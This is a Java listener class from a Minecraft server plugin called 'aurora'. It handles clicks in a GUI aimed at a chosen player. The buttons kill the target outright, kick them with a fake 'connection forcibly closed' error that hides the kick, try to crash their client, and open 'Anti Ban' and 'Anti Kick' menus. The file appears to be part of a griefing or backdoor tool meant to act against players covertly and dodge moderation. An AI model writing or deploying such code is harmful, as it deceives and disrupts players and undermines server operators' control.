package me.oscarcusick.aurora.Listeners.GUIListeners;

import me.oscarcusick.aurora.GUIs.AntiBanKickGUI;
import me.oscarcusick.aurora.GUIs.PlayerGUI;
import me.oscarcusick.aurora.Utility.GeneralUtility;
import net.md_5.bungee.api.ChatColor;
import org.bukkit.Particle;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.plugin.Plugin;

public class PlayerGUIListener implements Listener {
    Plugin PluginInstance;
    public PlayerGUIListener(Plugin PluginInstance) {
        this.PluginInstance = PluginInstance;
    }

    @EventHandler
    public void GUIClickListener(InventoryClickEvent event) {
        GeneralUtility GU = new GeneralUtility(PluginInstance);
        // if the username is not present where it should be && SAFETY CHECKS
        if ((event.getEventName().equalsIgnoreCase("InventoryCreativeEvent")) || (event == null)) {
            return;
        }
        else if (GU.StringContainsPlayerName(event.getView().getTitle().toLowerCase().substring(GU.AuroraChatLogo.length()+1, event.getView().getTitle().length()-1)) == null) {
            return;
        } event.setCancelled(true);

        // figure out which button pressed and act appropriately
        switch (event.getCurrentItem().getType()) {
            case DRAGON_HEAD:
                AntiBanKickGUI ABGUI = new AntiBanKickGUI(PluginInstance);
                ABGUI.OpenGUI((Player)event.getWhoClicked(), event.getView().getTitle().substring(GU.AuroraChatLogo.length()), "Anti Ban");
                return;
            case WITHER_SKELETON_SKULL:
                AntiBanKickGUI AKGUI = new AntiBanKickGUI(PluginInstance);
                AKGUI.OpenGUI((Player)event.getWhoClicked(), event.getView().getTitle().substring(GU.AuroraChatLogo.length()), "Anti Kick");
                return;
            case SKELETON_SKULL:
                GU.StringContainsPlayerName(event.getView().getTitle()).setHealth(0);
                GU.TellPlayer((Player)event.getWhoClicked(), "Successfully killed " + GU.Gold + ChatColor.BOLD + GU.StringContainsPlayerName(event.getView().getTitle()).getName());
                return;
            case IRON_BOOTS:
                GU.StringContainsPlayerName(event.getView().getTitle()).kickPlayer("Internal Exception: java.io.IOException: An existing connection was forcibly closed by the remote host");
                GU.TellPlayer((Player)event.getWhoClicked(), "Successfully kicked " + GU.Gold + ChatColor.BOLD + GU.StringContainsPlayerName(event.getView().getTitle()).getName());
                return;
            case BLAZE_POWDER:
                GU.AttemptCrash((Player)event.getWhoClicked(), GU.StringContainsPlayerName(event.getView().getTitle()));
                return;
            default:
                return;
        }

    }
}
